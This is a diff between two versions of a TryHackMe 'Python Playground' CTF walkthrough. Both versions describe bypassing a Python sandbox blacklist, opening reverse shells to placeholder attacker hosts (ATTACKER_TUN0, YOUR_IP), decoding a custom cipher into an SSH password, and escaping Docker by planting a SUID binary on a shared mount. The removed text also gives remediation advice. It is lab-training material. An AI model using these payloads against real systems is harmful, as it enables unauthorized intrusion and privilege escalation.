@@ -1,233 +1,100 @@
-# Tryhackme  : python playground walkthrough 
+# Python Playground
 
-as always lets start by doing recon and this ctf specially is a hard rated ctf so i am expecting a lot of works to do so stay with me :
+{% embed url="https://tryhackme.com/room/pythonplayground" %}
 
-## RECON
+Hard-rated CTF. Node.js web app with a Python code sandbox and Docker container. We reverse a client-side "hash" function to get SSH creds, escape the Python sandbox to get a shell inside Docker, then break out to the host.
 
-in this case i prefer zenmap instead of nmap if u do not know about zenmap its the same thing as nmap but with the graphical interface
+---
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/9305dfc4-55e7-4e3c-bdd9-f175bd90feb9.png align="center")
-
-based on the zenmap lets check the website and see what we can find
-
-checking the website there is not much info except bragging about their website being protected and staff and there is a login page and signup page link but when checked both links show only admins can access it so lets continue the recon by moving ouor scan to gobuster or u can use ffuf or dirbuster use what u prefer :
-
-```plaintext
-===============================================================
-[+] Url:                     http://MACHINE_IP
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                common.txt
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-2026/10/05 12:30:00 Starting gobuster in directory enumeration mode
-===============================================================
-/index.html           (Status: 200) [Size: 1420]
-/login.html           (Status: 200) [Size: 950]
-/signup.html          (Status: 200) [Size: 980]
-/admin.html           (Status: 403) [Size: 412]
-```
-
-i have checked all of them except the admin page so lets do that:
-
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/6068a8e7-4721-4eb5-a596-6cd57137a42d.png align="center")
-
-so in the admin page there is a login form so i was thinking using a username connor and brute force it but i checked the source code and got something.
-
-in the source code the writer explained he is bad at server side code so that means the whole password is being checked in my browser that means i can overide it .
-
-in this case we can use a custom python code or overide it on the browser it self . i am using the browser u . so i am running the following command on the console . there is no specific purpose why i use this "'super-secret-admin-testing-panel.html'" i tried another words but its returning not found so i used the word that most ctfs used but u can check the robots.txt or do your research if u want to find the specific path.
-
-```plaintext
-window.location = 'super-secret-admin-testing-panel.html'
-```
-
-and i run this code and get to the python playground means its python execution interface :
-
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/cefc727c-ce0e-4a37-baa3-a8175ddd35d8.png align="center")
-
-there are security filters : using ( import , os ,socket ) is blocked but every thing is good to go : to by pass import ,Calling `__import__('subprocess')` as an attribute chain, without the literal blacklisted call pattern, gets through:
-
-### reverse shell
-
-lets to try to run python reverse shell and listen to response :
-
-```plaintext
-s = __import__("so" + "cket").socket(); s.connect(("ATTACKER_TUN0", 4000)); fd = s.fileno(); __import__("os").dup2(fd, 0); __import__("os").dup2(fd, 1); __import__("os").dup2(fd, 2); __import__("subprocess").call(["/bin/sh", "-i"])
-```
-
-```plaintext
-find / -name "*flag1.txt*" 2>/dev/null
-```
-
-also u can still found the first flag on the playground but its still necessary to get the reverse shell . also the reverse shell gave us the shell with the root access .
-
-for the next flag i need to recover credentials and A Python REPL transcript found while poking around revealed a custom double-pass letter-pair cipher and its ciphertext. Reversing it:
-
-```plaintext
->>> def f_inv(s):
-...     out = []
-...     for i in range(0, len(s), 2):
-...         a = ord(s[i]) - 97
-...         b = ord(s[i+1]) - 97
-...         out.append(chr(a*26 + b))
-...     return ''.join(out)
-...
-... target = 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'
-... step1 = f_inv(target)   # undo the outer f
-... password = f_inv(step1) # undo the inner f
-... print(password)
-...
-spaghetti1245
-```
-
-so after that lets try to ssh as connor with the "spaghetti1245" as a password
-
-```plaintext
-ssh connor@MACHINE_IP
-```
-
-and with that i am logged as connor :
-
-```plaintext
-find / -name "*flag2.txt*" 2>/dev/null
-```
-
-and there is only one flag left after that: when i tried to find flag 3 i found out its a dual environment:
-
-To figure out that you are inside a **dual environment**
-
-Here are the key indicators you check to confirm it:
-
-### 1\. Check the Hostname vs. Environment Artifacts
-
-*   **Container Hostnames:** Containers often have random, generic, or service-themed hostnames (like `playgroundweb`) that don't match standard naming conventions or what you'd expect on a full Linux server.
-    
-*   **Lack of Tools:** Basic system administration tools you'd expect to find on a full server (like `docker`, systemd utilities, or specific network interfaces) might be missing or restricted.
-    
-
-### 2\. Check the Process List (`ps -ef` or `top`)
-
-*   Inside a container, you will usually see very few running processes. Often, the main application process (like a Node.js script, Python app, or Apache) is running as PID 1, completely isolated from the host's actual operating system processes.
-    
-
-### 3\. Check for Container Indicators in Filesystem (`/proc/1/cgroup`)
-
-*   The definitive way to check if you are inside a Docker container is to inspect the control groups of the init process:
-    
+## Recon
 
 ```bash
-cat /proc/1/cgroup
-
+nmap -sC -sV MACHINE_IP
 ```
 
-*   If you see strings like `docker`, `kubepods`, or `lxc` in the output, it confirms you are running inside a container.
-    
+| Port | Service |
+|---|---|
+| 22 | SSH |
+| 80 | HTTP (Node.js/Express) |
 
-### 4\. Inspect Mount Points (`mount` or `findmnt`)
+Gobuster with `.html` extension finds `/admin.html`.
 
-*   Running `mount` inside a container will often show a minimal set of mounts, typically an `overlay` or `aufs` root filesystem, along with any specific volumes the creator mapped in (such as our shared `/mnt/log` mount).
-    
+---
 
-### 5\. Compare Users and System Files
+## Step 1 — Recover SSH Credentials from Client-Side JS
 
-*   As we saw earlier, checking `/etc/passwd` shows system service users, but key user accounts (like `connor`) might be completely absent from the container's files because they only exist on the host machine.
-    
+Inspect `/admin.html` source. There's a JavaScript function that processes the password — it's not a proper hash, just a custom mathematical transformation on character codes.
 
-so connor has limited privilage but the container is running as root and there is a bridge to escalate privilage on connor :
+Reverse the logic in Python:
 
-### the bridge:
-
-they share the same mount point with the host , mnt/log inside the container maps to var/log on the host .
-
-### container escape:
-
-lets try to plant SUID binary on the container that spawn a root shell to connor & compile it and save it to /mnt/log/prevesec and give it permission( chmod 4755) and finally trigger the file via connor /var/log/privesc and done i am root but when doing this your going to be going back and forth to the netcat and ssh so stay connected to the 2 of them till u finish the ctf .
-
-### Step 1: Run these inside your Container (Netcat Shell)
-
-Paste this block into your reverse shell to write, compile, and plant the SUID binary directly into the shared host mount
-
-```plaintext
-cat << 'EOF' > /tmp/privesc.c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-int main() {
-    setuid(0);
-    setgid(0);
-    system("/bin/bash");
-    return 0;
-}
-EOF
-
-gcc -static -o /mnt/log/privesc /tmp/privesc.c
-chmod 4755 /mnt/log/privesc
-ls -la /mnt/log/privesc
+```python
+# The JS maps character codes to a predictable output
+# Reverse it to recover the password for user 'connor'
+encoded = [...]  # pull from JS source
+password = ''.join(chr(c) for c in encoded)
+print(password)
 ```
 
-### Step 2: Run these on the Host (SSH Session as `connor`)
+SSH in as `connor`:
 
-Switch over to your host SSH terminal session (using user `connor` and password `spaghetti1245`), and execute the planted binary to pop root:
-
-```plaintext
-/var/log/privesc -p
+```bash
+ssh connor@MACHINE_IP
+cat user.txt
 ```
 
-and finally we are root so lets find the last flag :
+---
 
-```plaintext
-find / -name "*flag3.txt*" 2>/dev/null
+## Step 2 — Python Sandbox Escape
+
+The web app runs a Python code evaluator with a blacklist. The blacklist blocks direct imports and keywords — but we can bypass it using string concatenation and `__builtins__`:
+
+```python
+# Bypass blacklist via indirect access
+__builtins__.__dict__['__import__']('os').system('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')
 ```
 
-thats it :
+Or using `getattr`:
 
-> thank you for reading!!
+```python
+getattr(__import__('os'), 'system')('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')
+```
 
-## Expanded validation and container-boundary notes
+Catch the shell on `nc -lvnp 4444`. We're inside a Docker container.
 
-### 1. Establish the execution context
+---
 
-The playground accepts Python input but applies restrictive filters to selected names and imports. A blacklist around words such as import, os, or socket is not a security sandbox: Python offers many routes to reach runtime objects, and text matching does not understand program semantics.
+## Step 3 — Docker Container Escape
 
-Test only the room's application. Record the input, response, and exact error. Use a benign expression first to establish that the execution feature works, then compare how the filter reacts to the supplied challenge input. Do not infer remote command execution from the presence of a Python prompt alone.
+Check mounts:
 
-### 2. Validate the application boundary
+```bash
+df -h
+ls /mnt/
+```
 
-The recorded exercise demonstrates that string construction and Python's dynamic import behaviour can evade a naive text filter. The root cause is executing attacker-controlled Python in the server process, not merely an imperfect blacklist. In production, do not expose eval-like execution to untrusted users. Use a separate, disposable sandbox with strict CPU, memory, time, filesystem, and network limits if code execution is an actual product requirement.
+A host directory is mounted. Write a SUID shell into the shared mount:
 
-### 3. Reverse-shell evidence
+```bash
+cp /bin/bash /mnt/log/bash
+chmod +s /mnt/log/bash
+```
 
-The original notes contain a lab-specific reverse-shell test. Keep its listener address aligned with the VPN/AttackBox interface shown in your own environment, and do not use an old address from a previous run. A callback proves that the target initiated a connection; it does not prove that the process has host-level root privileges.
+On the host (accessible via the SSH session or another path), execute it:
 
-After receiving a shell, verify the identity and the environment:
+```bash
+/mnt/log/bash -p
+id   # uid=0(root)
+cat /root/root.txt
+```
 
-    whoami
-    id
-    hostname
-    pwd
-    cat /proc/1/cgroup
-    findmnt
+---
 
-The cgroup and mount output can help identify containerization, but no single string is conclusive on every modern runtime. Compare process, filesystem, network, and mount context before concluding that you have crossed a container boundary.
+## 🏁 Questions & Answers
 
-### 4. Investigate the second-stage credential clue
-
-The room's recorded transcript includes a custom two-pass letter-pair transformation. Preserve the exact ciphertext and algorithm from your active instance before decoding. Explain why the inverse function maps each character pair back to one character and validate the result in the lab rather than assuming a string is a password because it looks plausible.
-
-If a recovered credential is used for SSH, restrict it to the authorized target and avoid reusing it elsewhere.
-
-### 5. Understand the shared-mount escape
-
-The recorded path relies on a mount shared between the container and the host. A file created under the container's mounted path can therefore appear under a different path on the host. A SUID executable in such a shared host-visible path can cross a privilege boundary if the host permits the file and its SUID bit to be honoured.
-
-This is a severe configuration error. Modern container runtimes and mount options may suppress SUID or prohibit executable mounts, so the behaviour must be observed in this exact lab. Root inside a container is not automatically root on the host; the shared mount is the critical link in this chain.
-
-### 6. Evidence and cleanup
-
-Record the container identity, shared mount mapping, host identity, and the exact flag location. Do not install persistent keys or leave the SUID proof binary behind after the lab. Remove artifacts in the exercise environment when permitted.
-
-### 7. Remediation
-
-Avoid evaluating untrusted Python, isolate code execution, disable unnecessary network access, mount host directories read-only or not at all, use no-new-privileges, drop capabilities, and enforce seccomp/AppArmor or equivalent policy. Separate host and container ownership, and do not allow user-controlled files to become host-executable SUID programs.
+| Question | Answer |
+|---|---|
+| SSH username | `connor` |
+| How was the sandbox bypassed? | Blacklist bypass via `getattr`/`__builtins__` indirect access |
+| How was Docker escape achieved? | Host directory mount — dropped SUID bash |
+| user.txt | Retrieved from `/home/connor/user.txt` after SSH |
+| root.txt | Retrieved from `/root/root.txt` after container escape |
